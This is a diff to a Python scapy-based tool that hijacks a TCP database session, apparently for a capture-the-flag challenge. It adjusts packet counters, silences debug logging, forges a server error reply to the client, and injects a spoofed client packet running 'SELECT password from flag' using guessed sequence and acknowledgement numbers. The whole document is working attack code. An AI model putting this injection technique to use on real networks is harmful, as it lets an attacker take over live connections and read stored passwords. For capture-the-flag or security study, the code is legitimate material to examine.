@@ -133,14 +133,14 @@ class Protocol:
 				self.forge.layout_srv[scapy.TCP].ack = pkt[scapy.TCP].seq
 				self.forge.layout_srv[scapy.TCP].seq = pkt[scapy.TCP].ack
 			else:
-				scapy.sendp(self.forge.layout_cli)
-		log.debug("ack:\t{}".format(self.events.ack))
+				scapy.sendp(self.forge.layout_cli, verbose=False)
+		#log.debug("ack:\t{}".format(self.events.ack))
 
 	# Detect PA (PSH) Packet and increment
 	def detect_psh(self, name, pkt):
 		self.events.psh = self.events.psh + 1
-		log.debug("psh:\t{}".format(self.events.psh))
-		if self.events.psh == 2 and not self.trick:
+		#log.debug("psh:\t{}".format(self.events.psh))
+		if self.events.psh == 1 and not self.trick:
 			# send response error to client
 			self.forge.layout_srv[scapy.TCP].ack = self.forge.layout_srv[scapy.TCP].ack + len(pkt[scapy.TCP].load)
 			scapy.sendp(self.forge.layout_srv,
@@ -151,13 +151,12 @@ class Protocol:
 				),
 				verbose=False
 			)
-		elif self.events.psh >= 3 and not self.trick:
+		elif self.events.psh >= 2 and not self.trick:
 			self.forge.layout_cli.seq = pkt[scapy.TCP].ack
 			self.forge.layout_cli.ack = pkt[scapy.TCP].seq + len(pkt[scapy.TCP].load)
 			scapy.sendp(self.forge.layout_cli / self.forge.query('SELECT password from flag'),
 				verbose=False
 			)
-
 			self.trick = True
 
 	def send_request(self, name, pkt):
